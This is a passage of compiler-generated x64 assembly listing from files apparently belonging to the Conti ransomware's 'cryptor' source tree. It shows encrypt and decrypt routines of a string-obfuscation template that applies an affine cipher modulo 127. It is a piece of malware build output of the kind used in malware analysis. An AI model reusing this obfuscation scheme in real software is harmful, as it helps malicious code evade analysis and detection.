  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 2f	 add	 r8d, 47			; 0000002fH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 7a	 sub	 eax, 122		; 0000007aH
  00006	44 6b c0 19	 imul	 r8d, eax, 25

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 c0 02	 add	 eax, 2
  00006	44 6b c0 3d	 imul	 r8d, eax, 61		; 0000003dH
  0000a	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c8	 mov	 ecx, r8d
  00015	2b ca		 sub	 ecx, edx
  00017	d1 e9		 shr	 ecx, 1
  00019	03 ca		 add	 ecx, edx
  0001b	c1 e9 06	 shr	 ecx, 6
  0001e	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00021	44 2b c1	 sub	 r8d, ecx
  00024	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00028	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ PROC ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DN@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ ENDP ; MetaBuffer<61,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 39	 sub	 eax, 57			; 00000039H
  00006	44 6b c0 33	 imul	 r8d, eax, 51		; 00000033H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 85 39
	00 00 00	 lea	 r8d, DWORD PTR [rax*4+57]
  0000b	44 03 c0	 add	 r8d, eax
  0000e	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00013	41 f7 e0	 mul	 r8d
  00016	41 8b c8	 mov	 ecx, r8d
  00019	2b ca		 sub	 ecx, edx
  0001b	d1 e9		 shr	 ecx, 1
  0001d	03 ca		 add	 ecx, edx
  0001f	c1 e9 06	 shr	 ecx, 6
  00022	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00025	44 2b c1	 sub	 r8d, ecx
  00028	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  0002c	c3		 ret	 0
?encrypt@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ PROC ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$04$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<5,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
_TEXT	ENDS
END
